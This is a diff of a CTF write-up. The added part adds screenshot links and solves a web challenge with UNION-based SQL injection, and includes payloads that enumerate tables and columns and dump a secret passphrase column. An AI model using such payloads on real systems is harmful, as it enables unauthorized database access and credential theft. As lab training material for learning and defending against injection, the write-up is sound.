@@ -1,4 +1,4 @@
-<h3> ForeverCTF  </h3>
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3e3f137b-3e18-4bbf-a2ea-2d76e5506701)<h3> ForeverCTF  </h3>
 
 <h3> Challenge Solved: </h3>
 
@@ -61,6 +61,7 @@ __P.S I'll be updating since I haven't really solved all the challs and the ctf 
 
 
 ### Web 8/8:~
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8f9770c-1c58-4c75-a082-202043e60112)
 
 #### Start at the Source 
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f400d2ca-8e7c-4a86-a5ec-69bc518ac1a3)
@@ -329,4 +330,33 @@ First let us dump all the tables
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9769f93-9c57-4c4b-81f3-f7efc7a47c7e)
 
 ```r
+Payload: ' union select table_name from information_schema.tables --
+```
 
+Looking at the result I found this table name fishy
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/184e5ffb-8a07-4f51-91d5-fced1757f3c3)
+
+```
+secret_users_table_sfd33
+```
+
+Seems like it's the right table 🤔
+
+Let us check the coulumns there
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff620291-2e0f-488d-8804-f09c6435491d)
+
+```
+Payload: ' union select column_name from information_schema.columns where table_name = 'secret_users_table_sfd33' --
+```
+
+At this point we would want to dump the `passfrase` column from the `secret_users_table_sfd33` table
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/73c7b399-4f4b-4580-bf72-c9a48feb8c4d)
+
+```
+Payload: ' union select passfrase from secret_users_table_sfd33 --
+```
+
+### Binary Exploitation 14/14:~
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/efdaedac-30c9-441d-98a9-0f760ebd995c)
+
+#### uint64_t
